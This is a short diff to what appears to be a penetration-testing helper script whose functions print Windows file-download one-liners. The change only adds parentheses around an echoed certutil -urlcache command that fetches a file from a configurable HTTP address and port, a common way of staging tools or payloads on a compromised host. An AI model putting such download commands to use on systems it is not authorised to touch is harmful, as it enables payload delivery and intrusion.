@@ -34,7 +34,7 @@ generate_certutil() {
         echo "HTTP IP address and port must be set before running certutil."
         return 1
     fi
-    echo "certutil -urlcache -f http://$http_ip:$http_port/$file $outfile;"
+    echo "(certutil -urlcache -f http://$http_ip:$http_port/$file $outfile);"
 }
 
 generate_iwr() { 
